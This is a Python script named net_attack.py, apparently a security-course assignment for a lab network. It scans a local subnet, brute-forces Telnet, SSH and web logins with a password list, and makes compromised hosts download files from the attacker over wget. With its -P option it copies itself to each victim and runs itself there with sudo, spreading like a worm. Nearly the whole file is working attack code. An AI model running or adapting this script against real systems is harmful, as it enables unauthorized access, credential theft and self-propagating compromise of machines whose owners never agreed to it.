#!/usr/bin/env python3

from scapy.all import *
from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
import requests
import os
import netifaces as ni
import shutil
import time
from datetime import datetime

COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_ENDC = "\033[0m"

# Test mode makes it easier to test:
# It limits the IP scan to 10 IP addresses in the /24 network
# And it also writes to a log so check that the spawned attacks
# are working when the -P options is used. I would have made
# this a command line parameters, but it's not part of the spec.
TESTMODE = True


class Attack:

    def __init__(self, args):
        self.REQUIRED_PARAMS = ["-p", "-u", "-f"]
        self.passed_arguments = args
        self.ip_list_file = ""
        self.ports_to_scan = []
        self.username = ""
        self.password_list_file = ""
        self.ip_list_to_attack = []
        self.password_list_to_use = []
        self.files_to_transfer = []
        self.do_network_scan = False
        self.this_script_name = self.passed_arguments[0].replace("./", "")
        self.this_host_ips = []
        self.self_propagate = False

        self.get_my_ip_addresses()

    def check_args(self):
        # First check that all the required parameters have been passed
        # If not, then print helper function and don't continue
        arg_error = False
        for param in self.REQUIRED_PARAMS:
            if param not in self.passed_arguments:
                print(str(param) + " is missing")
                arg_error = True

        if arg_error:
            self.help()
            return

        # If we got this far then all the required params switches are
        # present, and we just need to read them by getting the index of the
        # position of the parameter and reading the value at index + 1
        # Port To Scan (-p) is converted from a delimited string to a list
        try:
            self.ports_to_scan = self.passed_arguments[self.passed_arguments.index("-p") + 1].split(",")
            self.username = self.passed_arguments[self.passed_arguments.index("-u") + 1]
            self.password_list_file = self.passed_arguments[self.passed_arguments.index("-f") + 1]
        except:
            # Any problems reading the argument values, throw instructions for correct usage
            self.help()
            return

        # Read the optional params
        try:
            # if a list of files is passed, just take the first one
            file_to_transfer = self.passed_arguments[self.passed_arguments.index("-d") + 1].split(",")[0]
            self.files_to_transfer.append(file_to_transfer)
            isset_d = True
        except ValueError:
            isset_d = False
            # If -d isn't set then try looking for -P
            try:
                if self.passed_arguments.index("-P") >= 0:
                    # if the -P parameter is passed include passwords.txt and this file in the file list to deploy
                    # passwords.txt needs to be the first to transfer as we execute after net_attack.py is transferred
                    self.files_to_transfer = ["passwords.txt",
                                              self.this_script_name]
                    self.self_propagate = True
            except ValueError:
                self.files_to_transfer = []
        except IndexError:
            print("You must provide at least one file to transfer if you use the -d parameter")
            self.help()

        try:
            self.ip_list_file = self.passed_arguments[self.passed_arguments.index("-t") + 1]
        except ValueError:
            # -t is not set, so try looking for -L
            try:
                if self.passed_arguments.index("-L") >= 0:
                    self.do_network_scan = True
                    self.ip_list_file = ""
            except ValueError:
                self.help()

        # Do some basic checks on the values provided in the arguments
        # Check that valid port numbers have been provided
        for port in self.ports_to_scan:
            if not str(port).isnumeric():
                print("Invalid port numbers provided. Ports need to be numeric.")
                self.help()
                return
            if int(port) < 1 or int(port) > 65535 or not str(port).isnumeric():
                print("Invalid port numbers provided. Ports need to be between 1 and 65535.")
                self.help()
                return

        # If we're not doing a network scan, check that the ip list file (in -p argument) actually exists
        if not self.do_network_scan:
            if not os.path.exists(self.ip_list_file):
                print(self.ip_list_file + " was not found. Check the path and try again.")
                self.help()
                return

        # Check that the password file (in -f argument) actually exists
        if not os.path.exists(self.password_list_file):
            print(self.password_list_file + " was not found. Check the path and try again.")
            self.help()
            return

        # Finally, print out the arguments passed and their values
        print("net_attack is being run with the following configuration:\n")
        if self.do_network_scan:
            print("\t-L\tIP Addresses: Local scan --> /24 IP addresses")
        else:
            print("\t-t\tIP Address List File: " + self.ip_list_file)
        print("\t-p\tPorts: " + ",".join(self.ports_to_scan))
        print("\t-u\tUsername: " + self.username)
        print("\t-f\tPassword List File: " + self.password_list_file)
        if self.self_propagate:
            print("\t-P\tFiles to Transfer: " + ",".join(self.files_to_transfer))
        elif isset_d:
            print("\t-d\tFile to Transfer: " + ",".join(self.files_to_transfer))
        if TESTMODE:
            print("\n" + COLOR_YELLOW  + "********** TEST MODE IS ON **********\n" + COLOR_ENDC)
        else:
            print("\n" + COLOR_YELLOW  + "********** TEST MODE IS OFF **********\n" + COLOR_ENDC)

    def read_ip_list(self, ip_file):
        # This method reads a file and puts each non-blank line into the list of ip addresses to attack
        ip_file_obj = open(ip_file, "r")
        ip_file_content = ip_file_obj.read()
        ip_file_obj.close()
        # Parse the file into a list, and use filter() to ignore blank lines
        self.ip_list_to_attack = list(filter(None, ip_file_content.split("\n")))

        return self.ip_list_to_attack

    def is_reachable(self, ip):
        # This method sends an ICMP packet to the provided IP address and checks for a response within
        # 2 second. If there's any response at all, then we know the IP address is reachable

        icmp_packet = IP(dst=ip) / ICMP()
        response = sr1(icmp_packet, timeout=1, verbose=0)

        if response is not None:
            print(("Connected target found: " + ip).ljust(50))
            return True
        else:
            self.ip_list_to_attack.remove(ip)
            return False

    def scan_port(self, ip, port):
        # This method sends a TCP "SYN" packet to the IP and provided port number. It checks the flags
        # in the response and if its an "ACK" response (TCP flag value =  hex 12 (decimal 16)) we know
        # that port is open on the IP address. No response or any other value in the TCP flags mean the
        # port is closed or filtered
        ip_header = IP(dst=ip)
        tcp_header = TCP(dport=int(port), flags="S")
        tcp_packet = ip_header / tcp_header

        # Send the packet (just one)
        response = sr1(tcp_packet, verbose=0)
        # Check for a response
        if response is not None:
            if response.haslayer(TCP):
                if response.getlayer(TCP).flags == 0x12:
                    return True
        return False

    def enc(self, s):
        # Simple helper function to make the unicode --> ascii conversions in the bruteforce_telnet method
        # more readable
        return s.encode("ascii")

    def read_password_list_file(self, password_list_filename):
        # This functions reads a list of passwords from the password list file (-f argument)
        # Read the file content and close the file handle
        # In theory this should be called once from __init__ and the value stored in self.password_list_to_use
        # but the specs of assignment require it to be called from the bruteforce functions each time
        pwd_file_obj = open(password_list_filename, "r")
        pwd_file_content = pwd_file_obj.read()
        pwd_file_obj.close()

        # Return a python list where each line in the password list file is a list item
        # Ignore blank values
        return list(filter(None, pwd_file_content.split("\n")))

    def write_test_log(self, text):
        event_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open("/home/ubuntu/ATTACK_LOGS.txt", "a") as f:
            f.write(str(event_time) + ": " + text)
            f.close()

    def bruteforce_telnet(self, ip, port, username, password_list_filename):

        if TESTMODE:
            self.write_test_log("Telnet: " + self.this_host_ips[0] + " is attacking " + ip + "\n")
        successful_attacker_ip = ""

        # Get the list of passwords
        password_list_to_use = self.read_password_list_file(password_list_filename)

        # Try to open a telnet session using the provided username and each password guess in the password
        # list file. A timeout of 2 seconds for waiting for specific text is appropriate on a local mininet
        # network, but may need to be increased for higher-latency networks

        TELNET_TIMEOUT = 2

        # Iterate through the passwords until we've tried them all, or we find one that works
        for password in password_list_to_use:
            print(("\tTrying username " + str(username) + " and password " + str(password)).ljust(50), end="\r")
            conn = Telnet(ip, port)
            conn.read_until(self.enc("login:"),
                            timeout=TELNET_TIMEOUT)  # wait for the "login" text and then enter the username
            conn.write(self.enc(username + "\n"))
            conn.read_until(self.enc("password:"),
                            timeout=TELNET_TIMEOUT)  # wait for the "password" text and the end the password guess
            conn.write(self.enc(password + "\n"))
            found_text = conn.read_until(self.enc("Connected to " + ip + "."), timeout=TELNET_TIMEOUT)

            # If we get a welcome text, we know the username and password combination has worked.
            # Now we're going to use netcat (nc) to create a listener on port 2323 on the victim so that the attacker
            # can push a file to that port on the victim.
            if "Welcome" in str(found_text):
                print(COLOR_GREEN + "\tSuccess! Username and password found: " + str(username) + ":" + str(
                    password) + COLOR_ENDC)

                for file in self.files_to_transfer:

                    # Check if the victim already has this script
                    # This is a bit of a hack, but it works. The problem is that if we check for any return value that's
                    # also in the command we'll get a false positive. I'm working around this by asking the system to
                    # show me the line, word and character count for the output of an ls command. If searched-for file
                    # is there, the response will be "1       1      <name length + 1>". If it's not there then the
                    # ls command will fail to pipe to the wc command and we can assume the file isn't there

                    conn.write(self.enc("ls " + file + " | wc\n"))
                    file_name_length = len(file) + 1  # Adding one because ls pipes an extra \n character to wc
                    found_text = conn.read_until(self.enc("1       1      " + str(file_name_length)),
                                                 timeout=TELNET_TIMEOUT)
                    if ("1       1      " + str(file_name_length)) not in str(found_text):
                        print("\t" + str(file) + " not found. Deploying to " + ip)

                        # Because we have multiple IPs on the attacker, we may need to try to download from more than
                        # one attacker IP address
                        for attacker_ip in self.this_host_ips:
                            print("Trying to download " + file + " from " + attacker_ip + "...")
                            conn.write(self.enc("wget http://" + attacker_ip + ":8443/" + file + "\n"))
                            found_text = conn.read_until(self.enc("200 OK"), timeout=TELNET_TIMEOUT)
                            if "200 OK" in str(found_text):
                                successful_attacker_ip = attacker_ip
                                print("\tDownload successful")
                                break
                            else:
                                print("\tFailed")

                        # A special case - if we just downloaded this script, then make it executable and execute it
                        if str(file) == self.this_script_name:
                            all_ports = ",".join(self.ports_to_scan)
                            # print("\tchmod +x " + str(self.this_script_name) + "\n")
                            conn.read_very_eager()  # if you don't do this, the next line (chmod) sometimes doesn't work
                            conn.write(self.enc("chmod +x " + str(self.this_script_name) + "| echo $\n"))

                            print("\tLaunching " + self.this_script_name + " on " + ip)

                            # nohup to ensure process keeps running after telnet session is closed. Sudo because scapy
                            # bails without it.
                            conn.write(self.enc(
                                "nohup sudo ./" + self.this_script_name + " -L -p " + all_ports + " -u " + username
                                + " -f passwords.txt -P \n"))
                            found_text = conn.read_until(self.enc("password for"), timeout=TELNET_TIMEOUT)
                            if "password for" in str(found_text):
                                conn.write(self.enc(password + "\n"))
                                # Give the command shell a couple of seconds to start the process before closing the
                                # TELNET session
                            time.sleep(2)
                            conn.close()

                            # Because of limitations in the test environment, writing out to a file helps to show that
                            # the lateral movement and execution is actually working. Child scripts on compromised
                            # machines write
                            # to this same log file in a test environment
                            if TESTMODE:
                                self.write_test_log(
                                    "Telnet: " + successful_attacker_ip + " executed " + self.this_script_name + " on "
                                    + ip + "\n")

                    else:
                        print("\t" + file + " has already been deployed to " + ip)

                return str(username) + ":" + str(password)

        # If we get this far, we haven't found a valid password, so exit the method in silent shame
        print("\tNo login credentials were found".ljust(50))
        return ""

    def bruteforce_ssh(self, ip, port, username, password_list_filename):
        
        if TESTMODE:
            self.write_test_log("SSH: " + self.this_host_ips[0] + " is attacking " + ip + "\n")
        successful_attacker_ip = ""
        # Get the list of passwords
        password_list_to_use = self.read_password_list_file(password_list_filename)

        # Iterate through the passwords until we've tried them all, or we find one that works
        for password in password_list_to_use:
            print(("\tTrying username " + str(username) + " and password " + str(password)).ljust(60), end="\r")
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            try:
                client.connect(ip, port=port, username=username,
                               password=password)  # Try to set up an SSH session with the username and password
                # If we get this far, it means the username and password worked
                print(COLOR_GREEN + "\tSuccess! Username and password found: " + str(username) + ":" + str(
                    password) + COLOR_ENDC)
                for file in self.files_to_transfer:
                    ssh_stdin, ssh_stdout, ssh_stderr = client.exec_command("ls " + file + "\n")
                    ssh_return = (ssh_stdout.read().decode()).strip()

                    if str(ssh_return) == str(file):
                        print("\t" + str(file) + " has already been deployed to " + ip + ". Skipping.")
                    else:
                        print("\t" + str(file) + " not found. Deploying to " + ip)

                        # Because we have have multiple IPs on the attacker, we may need to try to download from more
                        # than one attacker IP address
                        for attacker_ip in self.this_host_ips:
                            print("Trying to download " + file + " from " + attacker_ip + "...")
                            ssh_stdin, ssh_stdout, ssh_stderr = client.exec_command(
                                "wget http://" + attacker_ip + ":8443/" + file)
                            # After download, look for the file again
                            time.sleep(2)
                            ssh_stdin, ssh_stdout, ssh_stderr = client.exec_command("ls " + file + "\n")
                            ssh_return = str(ssh_stdout.read().decode()).strip()

                            if ssh_return == str(file):
                                successful_attacker_ip = attacker_ip
                                print("\tDownload successful")
                                break
                            else:
                                print("\tDownload failed")

                        # A special case - if we just downloaded this script, then make it executable and execute it
                        if str(file) == self.this_script_name:
                            all_ports = ",".join(self.ports_to_scan)
                            ssh_stdin, ssh_stdout, ssh_stderr = client.exec_command(
                                "chmod +x " + str(self.this_script_name) + "| echo $")

                            print("\tLaunching " + self.this_script_name + " on " + ip)

                            # nohup to ensure process keeps running after telnet session is closed. Sudo because scapy
                            # bails without it.
                            ssh_stdin, ssh_stdout, ssh_stderr = client.exec_command(
                                "nohup sudo ./" + self.this_script_name + " -L -p " + all_ports + " -u " + username
                                + " -f passwords.txt -P", get_pty=True)
                            ssh_stdin.write(password + "\n")
                            # Give the command shell a couple of seconds to start the process before closing the SSH
                            # session
                            time.sleep(2)

                            # Because of limitations in the test environment, writing out to a file helps to show that
                            # the lateral movement and execution is actually working. Child scripts on compromised
                            # machines write
                            # to this same log file in a test environment
                            if TESTMODE:
                                self.write_test_log(
                                    "SSH: " + successful_attacker_ip + " executed " + self.this_script_name + " on " + ip + "\n")

                client.close()
                return str(username) + ":" + str(password)
            except (AuthenticationException) as e:
                # if you're going to fail, then fail gracefully and try again
                client.close()
                continue

        # If we get this far, it means we didn't succeed in finding a valid username and password.
        print("\tNo login credentials were found".ljust(50))
        return ""

    def bruteforce_web(self, ip, port, username, password_list_filename):

        if TESTMODE:
            self.write_test_log("Web: " + self.this_host_ips[0] + " is attacking " + ip + "\n")

        # Before during any bruteforce stuff, just check that a simple GET request to the IP & port works
        # If not, there's no point in wasting time trying loads of passwords
        try:
            get_response = requests.get("http://" + ip + ":" + str(port), timeout=10)
        except:
            # The lights are on but no-one's home
            return ""

        # OK, we're getting an HTTP response, so let's try to login
        url = "http://" + ip + ":" + str(port) + "/login.php"
        password_list_to_use = self.read_password_list_file(password_list_filename)

        # Iterate through the passwords until we've tried them all, or we find one that works
        for password in password_list_to_use:
            print(("\tTrying username " + str(username) + " and password " + str(password)).ljust(50), end="\r")
            data_to_post = {'username': username,
                            'password': password}  # This is like putting these values in the form and hitting submit
            try:
                post_response = requests.post(url, data=data_to_post)
            except:
                continue

            # If we see "Welcome" in the HTTP response, we know the username and password work. Our work here is done
            if "Welcome" in post_response.text:
                print(
                    COLOR_GREEN + "\n\tSuccess! Username and password found: " + username + ":" + password + COLOR_ENDC)
                return username + ":" + password
        print(("\tNo login credentials were found").ljust(50))
        return ""

    def help(self):
        print(
            "\nusage: net_attack.py (-L | -t IP_LIST_FILE) -p PORTS_TO_SCAN -u USERNAME -f PASSWORD_LIST_FILE [-d "
            "FILE_TO_UPLOAD] [-P]\n")
        print("A script to automate attacks on specified IP addresses or a local network scan\n")
        print("optional arguments:")
        print("\t-d FILE_TO_DEPLOY\tFile to deploy on a target machine")
        print("\t-P\t\t\tPropagate this script to victim machines\n")
        print("required named arguments:")
        print("\t-t IP_LIST_FILE\t\tFile containing IPv4 addresses list to attack")
        print("\t-L\t\t\tDo a local network scan for  potential victims")
        print("\t-p PORTS_TO_SCAN\tList of ports to scan E.g. 22,23,25,80")
        print("\t-u USERNAME\t\tUsername to use for the attacks")
        print("\t-f PASSWORD_LIST_FILE\tFile containing the password list\n")
        exit()

    def get_my_ip_addresses(self):
        # This method gets the list of ip addresses associated with non-loopback network interfaces on the current
        # attacker.
        self.this_host_ips = []
        for iface in ni.interfaces():
            if iface != "lo":
                self.this_host_ips.append(ni.ifaddresses(iface)[ni.AF_INET][0]["addr"])


def main():
    a = Attack(sys.argv)
    a.check_args()
    ip_addresses_to_attack = []

    if a.do_network_scan:
        for iface in ni.interfaces():
            if iface != "lo":  # Ignore the loopback interface as we don't want to attack ourselves
                my_ip = ni.ifaddresses(iface)[ni.AF_INET][0]["addr"]
                network_id = str(my_ip.split(".")[0]) + "." + str(my_ip.split(".")[1]) + "." + str(my_ip.split(".")[2])

                ip_max = 7 if TESTMODE else 255

                for host_id in range(1, ip_max):
                    if str(host_id) != str(my_ip.split(".")[3]):  # Again, don't attack ourselves
                        ip_addresses_to_attack.append(str(network_id) + "." + str(host_id))
        a.ip_list_to_attack = ip_addresses_to_attack.copy()
    else:
        ip_addresses_to_attack = a.read_ip_list(a.ip_list_file).copy()

    # Filter out the IP addresses that can't be pinged
    print("Verifying connectivity to target IP addresses...")
    for ip in ip_addresses_to_attack:
        print(("Searching for reachable victims. Trying " + ip).ljust(60), end="\r")
        a.is_reachable(ip)
    print(("Search complete\n").ljust(60))

    # If there are any ip addresses to target and we have the -d or -P options set:
    # Run a little web server on attacker port 8443 to allow transfer of files
    if len(a.ip_list_to_attack) > 0 and len(a.files_to_transfer) > 0:
        if not os.path.exists("/tmp/net_attack/"):
            os.mkdir("/tmp/net_attack/")
        for file in a.files_to_transfer:
            try:
                # Transfer the payload to the root of the new web server
                shutil.copyfile("/home/ubuntu/assignment_2/" + file, "/tmp/net_attack/" + file)
            except:
                pass
        for host_ip in a.this_host_ips:
            print("/usr/bin/php -S " + host_ip + ":8443 -t /tmp/net_attack/")
            os.system("/usr/bin/php -S " + host_ip + ":8443 -t /tmp/net_attack/ &")

    # With the remaining IP addresses, do a port scan
    for ip in a.ip_list_to_attack:
        for port in a.ports_to_scan:
            response = a.scan_port(ip, port)
            if response == True:
                print(ip + ":" + port + " is open")
                if int(port) == 23:
                    print("\tAttempting Telnet bruteforce attack...")
                    telnet_login_response = a.bruteforce_telnet(ip, port, a.username, a.password_list_file)

                if int(port) == 22:
                    print("\tAttempting SSH bruteforce attack...")
                    ssh_login_response = a.bruteforce_ssh(ip, port, a.username, a.password_list_file)

                if int(port) in (80, 8080, 8888):
                    print("\tAttempting Web login bruteforce attack...")
                    a.bruteforce_web(ip, port, a.username, a.password_list_file)

            else:
                print(ip + ":" + port + " is closed")


if __name__ == "__main__":
    main()
